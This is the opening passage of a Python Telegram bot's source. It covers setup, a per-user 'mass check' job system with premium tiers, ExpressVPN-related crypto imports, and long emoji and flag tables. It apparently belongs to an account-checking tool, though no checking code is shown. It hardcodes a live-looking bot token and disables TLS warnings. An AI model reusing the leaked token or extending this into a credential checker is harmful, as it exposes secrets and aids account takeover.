#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import json
import time
import threading
import zipfile
import shutil
import random
import string
import re
import binascii
import uuid
import importlib.util
import inspect
import base64
import hashlib
import struct
import urllib.parse as urlparse
import gzip
import hmac
from datetime import datetime, timedelta, timezone
from typing import Dict, List, Optional, Any, Tuple
from collections import deque

import httpx
import requests
try:
    from Crypto.Cipher import AES
except ImportError:
    try:
        from Cryptodome.Cipher import AES
    except ImportError:
        AES = None  # ExpressVPN paths need pycryptodome
from curl_cffi import requests as curl_requests
cffi_requests = curl_requests
from telebot import TeleBot, types
from telebot.apihelper import ApiTelegramException
from concurrent.futures import ThreadPoolExecutor
import logging

# ----- cryptography imports for ExpressVPN -----
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography.hazmat.primitives.padding import PKCS7
from cryptography import x509 as crypto_x509
from asn1crypto import cms, core, x509

# ----- disable warnings -----
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def safe_strftime(dt, fmt="%Y-%m-%d %H:%M:%S", default="N/A"):
    """Never call .strftime on None."""
    if dt is None:
        return default
    try:
        if isinstance(dt, str):
            s = dt.strip()
            if not s or s.upper() in ("NONE", "N/A", "NULL", "-"):
                return default
            try:
                dt = datetime.fromisoformat(s.replace("Z", "+00:00"))
            except Exception:
                return s
        return dt.strftime(fmt)
    except Exception:
        return default


# ==================== CONFIGURATION ====================
# ⚠️ NEVER hardcode your token – use environment variables!
# Token: env BOT_TOKEN wins; else hardcoded fallback (never leave empty)
_DEFAULT_TOKEN = "8626398860:AAEzM4zdRu6mWbw4dB7WwDE4I9EKrt1YW7U"
BOT_TOKEN = (os.getenv("BOT_TOKEN") or os.getenv("TELEGRAM_TOKEN") or os.getenv("TOKEN") or _DEFAULT_TOKEN or "").strip()
if not BOT_TOKEN:
    raise SystemExit("BOT_TOKEN is empty. Set env BOT_TOKEN or edit bot.py.")
MAIN_ADMIN_ID = 7200716402  # <-- CHANGE THIS TO YOUR TELEGRAM ID
CHANNEL_USERNAME = "@networkboyou"
CHANNEL_LINK = "https://t.me/networkboyou"
CONTACT_ADMIN = "@samvir1"

bot = TeleBot(BOT_TOKEN, parse_mode='HTML')

# Colored inline buttons (Telegram style: primary / success / danger)
_IKB_ORIG_TO_DICT = types.InlineKeyboardButton.to_dict

def _ikb_to_dict_with_style(self):
    d = _IKB_ORIG_TO_DICT(self)
    st = getattr(self, "style", None)
    if st:
        d["style"] = st
    return d

types.InlineKeyboardButton.to_dict = _ikb_to_dict_with_style



def wide_btn_text(label, min_len=28):
    """Pad label so Telegram draws a wider full-row button."""
    s = str(label).strip()
    if len(s) >= min_len:
        return s
    # center pad with spaces (Telegram keeps spaces in button text)
    pad = min_len - len(s)
    left = pad // 2
    right = pad - left
    return (" " * left) + s + (" " * right)

def ikb(text, callback_data=None, url=None, style=None, wide=True):
    """Inline button with optional color style (primary/success/danger)."""
    if wide and url is None:
        text = wide_btn_text(text, 32)
    kwargs = {}
    if callback_data is not None:
        kwargs["callback_data"] = callback_data
    if url is not None:
        kwargs["url"] = url
    btn = types.InlineKeyboardButton(text, **kwargs)
    if style:
        try:
            btn.style = style
        except Exception:
            pass
    return btn


# user_id -> {"stop": bool} for /stop during mass check
RUNNING_JOBS = {}
RUNNING_JOBS_LOCK = threading.Lock()
# free: 1 concurrent check; premium: 3 concurrent checks
def max_concurrent_checks(user_id):
    try:
        return 3 if is_premium(user_id) else 1
    except Exception:
        return 1

def count_user_jobs(user_id):
    with RUNNING_JOBS_LOCK:
        # support multi-job keys: uid or "uid:1"
        uid = int(user_id)
        n = 0
        for k, v in list(RUNNING_JOBS.items()):
            try:
                if int(str(k).split(":")[0]) == uid and v is not None:
                    n += 1
            except Exception:
                pass
        return n

def register_job(user_id):
    with RUNNING_JOBS_LOCK:
        uid = int(user_id)
        # find free slot
        for i in range(0, 10):
            key = uid if i == 0 and uid not in RUNNING_JOBS else f"{uid}:{i}"
            if key not in RUNNING_JOBS:
                RUNNING_JOBS[key] = {"stop": False, "uid": uid}
                return key
        # fallback overwrite primary
        RUNNING_JOBS[uid] = {"stop": False, "uid": uid}
        return uid

def set_job_stop(user_id):
    with RUNNING_JOBS_LOCK:
        uid = int(user_id)
        for k, v in list(RUNNING_JOBS.items()):
            try:
                if int(str(k).split(":")[0]) == uid and isinstance(v, dict):
                    v["stop"] = True
                    ev = v.get("event")
                    if ev is not None:
                        try:
                            ev.set()
                        except Exception:
                            pass
            except Exception:
                pass

def clear_job(job_key):
    with RUNNING_JOBS_LOCK:
        RUNNING_JOBS.pop(job_key, None)




# ==================== CUSTOM EMOJI MAPPING (Premium tg-emoji + fallbacks) ====================
# IDs from @fStikBot / @TgEmojis pack. Old keys preserved; new aliases added.
# Use E(key) or e_pair(start_key, end_key, text) so every line has different start/end emoji.
EMOJIS = {
    # --- legacy keys (still work) ---
    "diamond": '<tg-emoji emoji-id="6310032545304026289">💎</tg-emoji>',
    "success": '<tg-emoji emoji-id="6309618368722770953">✅</tg-emoji>',
    "error": '<tg-emoji emoji-id="6312156428106737991">🚫</tg-emoji>',
    "warn": '<tg-emoji emoji-id="6309743751703042732">⚠️</tg-emoji>',
    "settings": '<tg-emoji emoji-id="6309824011756904046">🎩</tg-emoji>',
    "play": '<tg-emoji emoji-id="6309870788245724520">🚀</tg-emoji>',
    "file": '<tg-emoji emoji-id="6309928100289322286">🔖</tg-emoji>',
    "input": '<tg-emoji emoji-id="6312231491250165922">✉️</tg-emoji>',
    "back": '<tg-emoji emoji-id="6311966281314606219">➡️</tg-emoji>',
    "stats": '<tg-emoji emoji-id="6309843875980648126">📊</tg-emoji>',
    "redeem": '<tg-emoji emoji-id="6312282231993801242">🎁</tg-emoji>',
    "channel": '<tg-emoji emoji-id="6309618596356039410">📣</tg-emoji>',
    "time": '<tg-emoji emoji-id="6309633203539811774">🗓</tg-emoji>',
    "search": '<tg-emoji emoji-id="6309744151135001261">👀</tg-emoji>',
    "music": '<tg-emoji emoji-id="6312315895947467982">✨</tg-emoji>',
    "media": '<tg-emoji emoji-id="6312315895947467982">✨</tg-emoji>',
    "add": '<tg-emoji emoji-id="6309697344581410091">👍</tg-emoji>',
    "remove": '<tg-emoji emoji-id="6312156428106737991">🚫</tg-emoji>',
    "code": '<tg-emoji emoji-id="6309599324837781578">🔐</tg-emoji>',
    "tool": '<tg-emoji emoji-id="6312247786356087263">💥</tg-emoji>',
    "link": '<tg-emoji emoji-id="6309893061946121745">🔗</tg-emoji>',
    "check": '<tg-emoji emoji-id="6310103949135322908">✔️</tg-emoji>',
    "crown": '<tg-emoji emoji-id="6310083389126876253">👑</tg-emoji>',
    "star": '<tg-emoji emoji-id="6309569217117035347">⭐</tg-emoji>',
    "speed": '<tg-emoji emoji-id="6309883501348919953">⚡</tg-emoji>',
    "target": '<tg-emoji emoji-id="6309958250959739643">💠</tg-emoji>',
    "unlock": '<tg-emoji emoji-id="6114032795082823008">🔓</tg-emoji>',
    # --- new pack (numbered ids from user list) ---
    "bottle": '<tg-emoji emoji-id="6310073991738433329">🍼</tg-emoji>',
    "ok1": '<tg-emoji emoji-id="6309618368722770953">✅</tg-emoji>',
    "sleepy": '<tg-emoji emoji-id="6312263609015606057">😪</tg-emoji>',
    "bang": '<tg-emoji emoji-id="6310012560821197814">‼️</tg-emoji>',
    "think": '<tg-emoji emoji-id="6310087310432018431">🧐</tg-emoji>',
    "spark": '<tg-emoji emoji-id="6312315895947467982">✨</tg-emoji>',
    "fireheart": '<tg-emoji emoji-id="6309579091246850317">❤️‍🔥</tg-emoji>',
    "whiteheart": '<tg-emoji emoji-id="6312215153194573209">🤍</tg-emoji>',
    "tick": '<tg-emoji emoji-id="6310103949135322908">✔️</tg-emoji>',
    "ok2": '<tg-emoji emoji-id="6309586272432169678">✅</tg-emoji>',
    "gem2": '<tg-emoji emoji-id="6309958250959739643">💠</tg-emoji>',
    "teddy": '<tg-emoji emoji-id="6312114182808411673">🧸</tg-emoji>',
    "thumb": '<tg-emoji emoji-id="6309697344581410091">👍</tg-emoji>',
    "megaphone": '<tg-emoji emoji-id="6309618596356039410">📣</tg-emoji>',
    "crown2": '<tg-emoji emoji-id="6310083389126876253">👑</tg-emoji>',
    "gift1": '<tg-emoji emoji-id="6312282231993801242">🎁</tg-emoji>',
    "gift2": '<tg-emoji emoji-id="6312196994072847118">🎁</tg-emoji>',
    "gift3": '<tg-emoji emoji-id="6309668976322420229">🎁</tg-emoji>',
    "star1": '<tg-emoji emoji-id="6309569217117035347">⭐</tg-emoji>',
    "top": '<tg-emoji emoji-id="6309690717446873246">🔝</tg-emoji>',
    "gift4": '<tg-emoji emoji-id="6309658290443787286">🎁</tg-emoji>',
    "cal": '<tg-emoji emoji-id="6309633203539811774">🗓</tg-emoji>',
    "smile": '<tg-emoji emoji-id="6309630076803620076">😊</tg-emoji>',
    "thought": '<tg-emoji emoji-id="6310080687592447094">💭</tg-emoji>',
    "pin": '<tg-emoji emoji-id="6309960153630251694">📌</tg-emoji>',
    "pin2": '<tg-emoji emoji-id="6309722401420617027">📌</tg-emoji>',
    "cash": '<tg-emoji emoji-id="6310069275864341980">💵</tg-emoji>',
    "up": '<tg-emoji emoji-id="6309994659397507681">🔼</tg-emoji>',
    "warn2": '<tg-emoji emoji-id="6309743751703042732">⚠️</tg-emoji>',
    "moneyfly": '<tg-emoji emoji-id="6312282773159680278">💸</tg-emoji>',
    "boom": '<tg-emoji emoji-id="6312247786356087263">💥</tg-emoji>',
    "bolt": '<tg-emoji emoji-id="6309883501348919953">⚡</tg-emoji>',
    "hat": '<tg-emoji emoji-id="6309824011756904046">🎩</tg-emoji>',
    "chart": '<tg-emoji emoji-id="6309843875980648126">📊</tg-emoji>',
    "gift5": '<tg-emoji emoji-id="6309810353760902385">🎁</tg-emoji>',
    "heart": '<tg-emoji emoji-id="6309591606781549616">❤️</tg-emoji>',
    "lock": '<tg-emoji emoji-id="6310091871687286225">🔒</tg-emoji>',
    "crown3": '<tg-emoji emoji-id="6312312842225719885">👑</tg-emoji>',
    "thumb2": '<tg-emoji emoji-id="6312057411930692887">👍</tg-emoji>',
    "crown4": '<tg-emoji emoji-id="6311999820714220870">👑</tg-emoji>',
    "glow": '<tg-emoji emoji-id="6309718793648084936">🌟</tg-emoji>',
    "skull": '<tg-emoji emoji-id="6309959943176855354">💀</tg-emoji>',
    "starface": '<tg-emoji emoji-id="6309631429718318812">🤩</tg-emoji>',
    "purpleheart": '<tg-emoji emoji-id="6309712213758189631">💟</tg-emoji>',
    "pin3": '<tg-emoji emoji-id="6309975125886247306">📌</tg-emoji>',
    "speaker": '<tg-emoji emoji-id="6309697666703958305">🔈</tg-emoji>',
    "angel": '<tg-emoji emoji-id="6311862802667543383">👼</tg-emoji>',
    "devil": '<tg-emoji emoji-id="6309577931605679628">😈</tg-emoji>',
    "wink": '<tg-emoji emoji-id="6309976259757611627">😉</tg-emoji>',
    "ok3": '<tg-emoji emoji-id="6309723191694598306">✅</tg-emoji>',
    "car": '<tg-emoji emoji-id="6309663096512191868">🚘</tg-emoji>',
    "dot": '<tg-emoji emoji-id="6312142645556680754">🔸</tg-emoji>',
    "cry": '<tg-emoji emoji-id="6312088000687773817">😭</tg-emoji>',
    "star2": '<tg-emoji emoji-id="6309890192907968770">⭐</tg-emoji>',
    "star3": '<tg-emoji emoji-id="6309948041822477866">⭐</tg-emoji>',
    "star4": '<tg-emoji emoji-id="6309552303535824017">⭐</tg-emoji>',
    "dizzy": '<tg-emoji emoji-id="6309969117226998989">💫</tg-emoji>',
    "rocket": '<tg-emoji emoji-id="6309870788245724520">🚀</tg-emoji>',
    "teddy2": '<tg-emoji emoji-id="6309933361624260056">🧸</tg-emoji>',
    "bolt2": '<tg-emoji emoji-id="6309552161801904640">⚡</tg-emoji>',
    "dizzy2": '<tg-emoji emoji-id="6309815310153162269">💫</tg-emoji>',
    "glow2": '<tg-emoji emoji-id="6309852414375631870">🌟</tg-emoji>',
    "star5": '<tg-emoji emoji-id="6309608516067794681">⭐</tg-emoji>',
    "cal2": '<tg-emoji emoji-id="6309604092251479566">🗓</tg-emoji>',
    "boom2": '<tg-emoji emoji-id="6310091579629510773">💥</tg-emoji>',
    "moneyface": '<tg-emoji emoji-id="6309665883945966515">🤑</tg-emoji>',
    "glow3": '<tg-emoji emoji-id="6309850700683681761">🌟</tg-emoji>',
    "fire": '<tg-emoji emoji-id="6309811869884358547">🔥</tg-emoji>',
    "champagne": '<tg-emoji emoji-id="6311989272274541113">🍾</tg-emoji>',
    "party": '<tg-emoji emoji-id="6309961712703379735">🎉</tg-emoji>',
    "glow4": '<tg-emoji emoji-id="6309662675605396578">🌟</tg-emoji>',
    "glow5": '<tg-emoji emoji-id="6309556053042273655">🌟</tg-emoji>',
    "glow6": '<tg-emoji emoji-id="6310011070467545671">🌟</tg-emoji>',
    "glow7": '<tg-emoji emoji-id="6309873253556952291">🌟</tg-emoji>',
    "gift6": '<tg-emoji emoji-id="6310006058240711366">🎁</tg-emoji>',
    "flag": '<tg-emoji emoji-id="6309813746785066712">🚩</tg-emoji>',
    "mail": '<tg-emoji emoji-id="6312231491250165922">✉️</tg-emoji>',
    "crown5": '<tg-emoji emoji-id="6310057786826824798">👑</tg-emoji>',
    "tongue": '<tg-emoji emoji-id="6309708769194417576">😛</tg-emoji>',
    "relieved": '<tg-emoji emoji-id="6309906470834019833">😌</tg-emoji>',
    "india": '<tg-emoji emoji-id="6311812044744039109">🇮🇳</tg-emoji>',
    "world": '<tg-emoji emoji-id="6309899938188762421">🌎</tg-emoji>',
    "card": '<tg-emoji emoji-id="6309963396330560685">💳</tg-emoji>',
    "moneyfly2": '<tg-emoji emoji-id="6309911221067849213">💸</tg-emoji>',
    "top2": '<tg-emoji emoji-id="6312289924280229167">🔝</tg-emoji>',
    "india2": '<tg-emoji emoji-id="6309616135339778435">🇮🇳</tg-emoji>',
    "india3": '<tg-emoji emoji-id="6312260555293859295">🇮🇳</tg-emoji>',
    "cry2": '<tg-emoji emoji-id="6309683733830048106">😭</tg-emoji>',
    "surprise": '<tg-emoji emoji-id="6310036148781587400">😯</tg-emoji>',
    "skull2": '<tg-emoji emoji-id="6309750022355295256">☠️</tg-emoji>',
    "ok4": '<tg-emoji emoji-id="6311816365481139039">✅</tg-emoji>',
    "blackcat": '<tg-emoji emoji-id="6311886833009565237">🐈‍⬛</tg-emoji>',
    "gift7": '<tg-emoji emoji-id="6312269299847272620">🎁</tg-emoji>',
    "white": '<tg-emoji emoji-id="6309619116047080957">⬜️</tg-emoji>',
    "eyes": '<tg-emoji emoji-id="6309744151135001261">👀</tg-emoji>',
    "gift8": '<tg-emoji emoji-id="6309602258300443734">🎁</tg-emoji>',
    "fireheart2": '<tg-emoji emoji-id="6312213499632163848">❤️‍🔥</tg-emoji>',
    "bell": '<tg-emoji emoji-id="6311933167116753547">🔔</tg-emoji>',
    "skull3": '<tg-emoji emoji-id="6309750181269085739">💀</tg-emoji>',
    "gem": '<tg-emoji emoji-id="6310032545304026289">💎</tg-emoji>',
    "disguise": '<tg-emoji emoji-id="6309827430550871685">🥸</tg-emoji>',
    "star6": '<tg-emoji emoji-id="6309914644156784572">⭐</tg-emoji>',
    "moai": '<tg-emoji emoji-id="6312245943815117669">🗿</tg-emoji>',
    "tree": '<tg-emoji emoji-id="6309619687277732398">🎄</tg-emoji>',
    "blueheart": '<tg-emoji emoji-id="6309787629088938025">💙</tg-emoji>',
    "link2": '<tg-emoji emoji-id="6309893061946121745">🔗</tg-emoji>',
    "thumb3": '<tg-emoji emoji-id="6311961887563062769">👍</tg-emoji>',
    "no": '<tg-emoji emoji-id="6312156428106737991">🚫</tg-emoji>',
    "tick2": '<tg-emoji emoji-id="6312152554046233663">✔️</tg-emoji>',
    "gem3": '<tg-emoji emoji-id="6309675169665261634">💎</tg-emoji>',
    "chat": '<tg-emoji emoji-id="6310075555106528104">💬</tg-emoji>',
    "fireheart3": '<tg-emoji emoji-id="6309667387184523396">❤️‍🔥</tg-emoji>',
    "bow": '<tg-emoji emoji-id="6309630987336687314">🎀</tg-emoji>',
    "bookmark": '<tg-emoji emoji-id="6309928100289322286">🔖</tg-emoji>',
    "bag": '<tg-emoji emoji-id="6309716736358751850">🛍</tg-emoji>',
    "bell2": '<tg-emoji emoji-id="6309697533559972000">🔔</tg-emoji>',
    "storm": '<tg-emoji emoji-id="6310026635429027214">🌩</tg-emoji>',
    "gift_heart": '<tg-emoji emoji-id="6309953955992444618">💝</tg-emoji>',
    "twohearts": '<tg-emoji emoji-id="6312321234591817004">💕</tg-emoji>',
    "ghost": '<tg-emoji emoji-id="6309711191555973151">👻</tg-emoji>',
    "cupid": '<tg-emoji emoji-id="6312260555293859296">💘</tg-emoji>',
    "slider": '<tg-emoji emoji-id="6311841903356680387">🎚</tg-emoji>',
    "alert": '<tg-emoji emoji-id="6312127578811407558">🚨</tg-emoji>',
    "gift9": '<tg-emoji emoji-id="6309788668471025598">🎁</tg-emoji>',
    "plead": '<tg-emoji emoji-id="6310049690813471739">🥹</tg-emoji>',
    "smile2": '<tg-emoji emoji-id="6309599204578699428">😊</tg-emoji>',
    "neutral": '<tg-emoji emoji-id="6310083702659488878">🙂</tg-emoji>',
    "thumb4": '<tg-emoji emoji-id="6309880082554954516">👍</tg-emoji>',
    "smile3": '<tg-emoji emoji-id="6309814103267351841">😊</tg-emoji>',
    "angry": '<tg-emoji emoji-id="6309636338865937525">😠</tg-emoji>',
    "unamused": '<tg-emoji emoji-id="6309862017922506332">😒</tg-emoji>',
    "pointup": '<tg-emoji emoji-id="6309857147429591917">👆</tg-emoji>',
    "rage": '<tg-emoji emoji-id="6310005568614440284">🤬</tg-emoji>',
    "bang2": '<tg-emoji emoji-id="6310077741244883032">‼️</tg-emoji>',
    "laugh": '<tg-emoji emoji-id="6312213289178766162">😂</tg-emoji>',
    "glow8": '<tg-emoji emoji-id="6309869972201938574">🌟</tg-emoji>',
    "blueheart2": '<tg-emoji emoji-id="6309889321029607029">💙</tg-emoji>',
    "glow9": '<tg-emoji emoji-id="6309553003615495379">🌟</tg-emoji>',
    "gift10": '<tg-emoji emoji-id="6312071430703945875">🎁</tg-emoji>',
    "apple": '<tg-emoji emoji-id="6309643498576420790">🍏</tg-emoji>',
    "angel2": '<tg-emoji emoji-id="6309742540522265784">👼</tg-emoji>',
    "devil2": '<tg-emoji emoji-id="6309826975284338144">😈</tg-emoji>',
    "star7": '<tg-emoji emoji-id="6309946353900330164">⭐</tg-emoji>',
    "lock2": '<tg-emoji emoji-id="6309599324837781578">🔐</tg-emoji>',
    "ring": '<tg-emoji emoji-id="6309616637850950829">💍</tg-emoji>',
    "trash": '<tg-emoji emoji-id="6309887495668505491">🗑️</tg-emoji>',
    "top3": '<tg-emoji emoji-id="6309622423171898626">🔝</tg-emoji>',
    "skull4": '<tg-emoji emoji-id="6310036956235438972">💀</tg-emoji>',
    "moai2": '<tg-emoji emoji-id="6309996239945475579">🗿</tg-emoji>',
    "heart2": '<tg-emoji emoji-id="6309789364255726360">❤️</tg-emoji>',
    "bolt3": '<tg-emoji emoji-id="6309627778996116881">⚡</tg-emoji>',
    "robot": '<tg-emoji emoji-id="6309920764485180319">🤖</tg-emoji>',
    "blue": '<tg-emoji emoji-id="6310043042204097096">🔵</tg-emoji>',
    "cool": '<tg-emoji emoji-id="6309750421787254668">😎</tg-emoji>',
    "glow10": '<tg-emoji emoji-id="6309860888346107243">🌟</tg-emoji>',
    "fast": '<tg-emoji emoji-id="6309994015152413596">⏩</tg-emoji>',
    "fire2": '<tg-emoji emoji-id="6309616088095143254">🔥</tg-emoji>',
    "two": '<tg-emoji emoji-id="6309942673113357179">2️⃣</tg-emoji>',
    "one": '<tg-emoji emoji-id="6309756481986109156">1️⃣</tg-emoji>',
    "wine": '<tg-emoji emoji-id="6311795401745768625">🍷</tg-emoji>',
    "wifi": '<tg-emoji emoji-id="6309616152519647727">🛜</tg-emoji>',
    "cool2": '<tg-emoji emoji-id="6309877582883986171">😎</tg-emoji>',
    "party2": '<tg-emoji emoji-id="6309717891704954276">🥳</tg-emoji>',
    "moai3": '<tg-emoji emoji-id="6309990089552308255">🗿</tg-emoji>',
    "fire3": '<tg-emoji emoji-id="6309800990732198827">🔥</tg-emoji>',
    "neutral2": '<tg-emoji emoji-id="6309599943313071073">🙂</tg-emoji>',
    "silly": '<tg-emoji emoji-id="6309592152242397846">😝</tg-emoji>',
    "thumb5": '<tg-emoji emoji-id="6309913110853459616">👍</tg-emoji>',
    "neutral3": '<tg-emoji emoji-id="6309694501313060554">🙂</tg-emoji>',
    "wow": '<tg-emoji emoji-id="6309881744707296792">😮</tg-emoji>',
    "rofl": '<tg-emoji emoji-id="6312178594432948717">🤣</tg-emoji>',
    "three": '<tg-emoji emoji-id="6309900737052679246">3️⃣</tg-emoji>',
    "grin": '<tg-emoji emoji-id="6310024749938384434">😀</tg-emoji>',
    "grin2": '<tg-emoji emoji-id="6309809318673784623">😀</tg-emoji>',
    "grin3": '<tg-emoji emoji-id="6311911477531908270">😀</tg-emoji>',
    "grin4": '<tg-emoji emoji-id="6310103425149312447">😀</tg-emoji>',
    "grin5": '<tg-emoji emoji-id="6309949944492989447">😀</tg-emoji>',
    "heart3": '<tg-emoji emoji-id="6309615701548079774">❤️</tg-emoji>',
    "sparkheart": '<tg-emoji emoji-id="6309799281335213508">💖</tg-emoji>',
    "cryingcat": '<tg-emoji emoji-id="6309574654545633377">😿</tg-emoji>',
    "smile4": '<tg-emoji emoji-id="6309727383582678622">😊</tg-emoji>',
    "skull5": '<tg-emoji emoji-id="6310087920317373435">💀</tg-emoji>',
    "fast2": '<tg-emoji emoji-id="6309559733829247319">⏩</tg-emoji>',
    "cupid2": '<tg-emoji emoji-id="6312111421144439616">💘</tg-emoji>',
    "heart4": '<tg-emoji emoji-id="6309656392068242512">❤</tg-emoji>',
    "gift11": '<tg-emoji emoji-id="6309768293146172946">🎁</tg-emoji>',
    "arrow": '<tg-emoji emoji-id="6311966281314606219">➡️</tg-emoji>',
    "sad": '<tg-emoji emoji-id="6309687448976760879">😞</tg-emoji>',
    "arrow2": '<tg-emoji emoji-id="6311866376080337926">➡️</tg-emoji>',
    "skull6": '<tg-emoji emoji-id="6310050743080459309">💀</tg-emoji>',
    "glow11": '<tg-emoji emoji-id="6309951821393697732">🌟</tg-emoji>',
    "hundred": '<tg-emoji emoji-id="6309565261452157609">💯</tg-emoji>',
    "ok5": '<tg-emoji emoji-id="6309694557147634037">✅</tg-emoji>',
    "duck": '<tg-emoji emoji-id="6312001195103756533">🦆</tg-emoji>',
    "happy": '<tg-emoji emoji-id="6311986403236388416">😃</tg-emoji>',
    "trophy": '<tg-emoji emoji-id="6311834808070708173">🏆</tg-emoji>',
    "cal3": '<tg-emoji emoji-id="6312140098641078501">🗓</tg-emoji>',
    "love": '<tg-emoji emoji-id="6309722302636367156">😍</tg-emoji>',
    "pin4": '<tg-emoji emoji-id="6309665828111392373">📌</tg-emoji>',
    "eye": '<tg-emoji emoji-id="6309677119580412918">👁</tg-emoji>',
}

# Ordered pool for rotating start/end emojis on every line
_EMOJI_POOL = [
    "diamond", "success", "spark", "fireheart", "crown", "star", "gem", "rocket",
    "fire", "bolt", "glow", "party", "trophy", "thumb", "ok1", "tick", "boom",
    "gift1", "heart", "top", "pin", "cash", "megaphone", "starface", "cool",
    "glow2", "fire2", "hundred", "india", "world", "card", "bell", "robot",
    "angel", "devil", "wink", "laugh", "rofl", "champagne", "teddy", "moai",
]


def E(key, default="💎"):
    """Resolve emoji key to tg-emoji HTML (fallback glyph if missing)."""
    v = EMOJIS.get(key)
    if v:
        return v
    # plain fallback
    return default


def plain_e(key, default="•"):
    """Unicode glyph from premium EMOJIS map (for progress when HTML fails / buttons)."""
    v = EMOJIS.get(key) or default
    if isinstance(v, str) and "tg-emoji" in v:
        m = re.search(r">([^<]+)<", v)
        return m.group(1) if m else default
    return v if isinstance(v, str) else default


def e_line(text, start_key=None, end_key=None, idx=None):
    """Wrap a sentence: different premium emoji at START and END."""
    if idx is None:
        idx = abs(hash(str(text))) % len(_EMOJI_POOL)
    sk = start_key or _EMOJI_POOL[idx % len(_EMOJI_POOL)]
    ek = end_key or _EMOJI_POOL[(idx + 7) % len(_EMOJI_POOL)]
    if ek == sk:
        ek = _EMOJI_POOL[(idx + 11) % len(_EMOJI_POOL)]
    return f"{E(sk)} {text} {E(ek)}"




def safe_choice(seq, default=None):
    """Never raise on empty sequence."""
    try:
        if seq:
            return random.choice(seq)
    except Exception:
        pass
    return default


def e_block(lines):
    """Apply e_line to each non-empty line with rotating pairs."""
    out = []
    n = 0
    for line in lines:
        if not line or not str(line).strip():
            out.append(line)
            continue
        # skip pure HTML separators / code already emoji-wrapped heavily
        s = str(line)
        if s.strip().startswith("<code>") and s.strip().endswith("</code>"):
            out.append(s)
            continue
        out.append(e_line(s, idx=n))
        n += 1
    return out


# Database Files
USERS_DB = "users.json"
REDEEM_CODES_DB = "redeem_codes.json"
ADMINS_DB = "admins.json"
BOT_SETTINGS_DB = "bot_settings.json"
CUSTOM_CHECKERS_DIR = "custom_checkers"

os.makedirs(CUSTOM_CHECKERS_DIR, exist_ok=True)


# ==================== COUNTRY FLAG HELPER ====================
COUNTRY_FLAGS = {
    "US": "🇺🇸", "GB": "🇬🇧", "UK": "🇬🇧", "DE": "🇩🇪", "FR": "🇫🇷", "ES": "🇪🇸", "IT": "🇮🇹",
    "TR": "🇹🇷", "BR": "🇧🇷", "JP": "🇯🇵", "KR": "🇰🇷", "IN": "🇮🇳", "CA": "🇨🇦", "AU": "🇦🇺",
    "MX": "🇲🇽", "NL": "🇳🇱", "SE": "🇸🇪", "NO": "🇳🇴", "DK": "🇩🇰", "FI": "🇫🇮", "PL": "🇵🇱",
    "RU": "🇷🇺", "AR": "🇦🇷", "CL": "🇨🇱", "CO": "🇨🇴", "PE": "🇵🇪", "AE": "🇦🇪", "SA": "🇸🇦",
    "EG": "🇪🇬", "ZA": "🇿🇦", "ID": "🇮🇩", "MY": "🇲🇾", "SG": "🇸🇬", "TH": "🇹🇭", "VN": "🇻🇳",
    "PH": "🇵🇭", "PT": "🇵🇹", "RO": "🇷🇴", "HU": "🇭🇺", "CZ": "🇨🇿", "UA": "🇺🇦", "AT": "🇦🇹",
    "CH": "🇨🇭", "BE": "🇧🇪", "IL": "🇮🇱", "TW": "🇹🇼", "HK": "🇭🇰", "PK": "🇵🇰", "NZ": "🇳🇿",
    "SK": "🇸🇰", "HR": "🇭🇷", "RS": "🇷🇸", "BG": "🇧🇬", "IE": "🇮🇪", "GR": "🇬🇷", "NG": "🇳🇬",
    "KE": "🇰🇪", "GH": "🇬🇭", "CN": "🇨🇳", "AF": "🇦🇫", "AL": "🇦🇱", "DZ": "🇩🇿", "AD": "🇦🇩",
    "AO": "🇦🇴", "AG": "🇦🇬", "AM": "🇦🇲", "AZ": "🇦🇿", "BS": "🇧🇸", "BH": "🇧🇭", "BD": "🇧🇩",
    "BB": "🇧🇧", "BY": "🇧🇾", "BZ": "🇧🇿", "BJ": "🇧🇯", "BT": "🇧🇹", "BO": "🇧🇴", "BA": "🇧🇦",
    "BW": "🇧🇼", "BN": "🇧🇳", "BF": "🇧🇫", "BI": "🇧🇮", "KH": "🇰🇭", "CM": "🇨🇲", "CV": "🇨🇻",
    "CF": "🇨🇫", "TD": "🇹🇩", "KM": "🇰🇲", "CG": "🇨🇬", "CD": "🇨🇩", "CR": "🇨🇷", "CI": "🇨🇮",
    "HR": "🇭🇷", "CU": "🇨🇺", "CY": "🇨🇾", "DJ": "🇩🇯", "DM": "🇩🇲", "DO": "🇩🇴", "EC": "🇪🇨",
    "SV": "🇸🇻", "GQ": "🇬🇶", "ER": "🇪🇷", "EE": "🇪🇪", "ET": "🇪🇹", "FJ": "🇫🇯", "GA": "🇬🇦",
    "GM": "🇬🇲", "GE": "🇬🇪", "GT": "🇬🇹", "GN": "🇬🇳", "GW": "🇬🇼", "GY": "🇬🇾", "HT": "🇭🇹",
    "HN": "🇭🇳", "IS": "🇮🇸", "IR": "🇮🇷", "IQ": "🇮🇶", "JM": "🇯🇲", "JO": "🇯🇴", "KZ": "🇰🇿",
    "KW": "🇰🇼", "KG": "🇰🇬", "LA": "🇱🇦", "LV": "🇱🇻", "LB": "🇱🇧", "LS": "🇱🇸", "LR": "🇱🇷",
    "LY": "🇱🇾", "LI": "🇱🇮", "LT": "🇱🇹", "LU": "🇱🇺", "MO": "🇲🇴", "MK": "🇲🇰", "MG": "🇲🇬",
    "MW": "🇲🇼", "MV": "🇲🇻", "ML": "🇲🇱", "MT": "🇲🇹", "MH": "🇲🇭", "MR": "🇲🇷", "MU": "🇲🇺",
    "FM": "🇫🇲", "MD": "🇲🇩", "MC": "🇲🇨", "MN": "🇲🇳", "ME": "🇲🇪", "MA": "🇲🇦", "MZ": "🇲🇿",
    "MM": "🇲🇲", "NA": "🇳🇦", "NR": "🇳🇷", "NP": "🇳🇵", "NI": "🇳🇮", "NE": "🇳🇪", "KP": "🇰🇵",
    "OM": "🇴🇲", "PW": "🇵🇼", "PS": "🇵🇸", "PA": "🇵🇦", "PG": "🇵🇬", "PY": "🇵🇾", "QA": "🇶🇦",
    "RW": "🇷🇼", "KN": "🇰🇳", "LC": "🇱🇨", "VC": "🇻🇨", "WS": "🇼🇸", "SM": "🇸🇲", "ST": "🇸🇹",
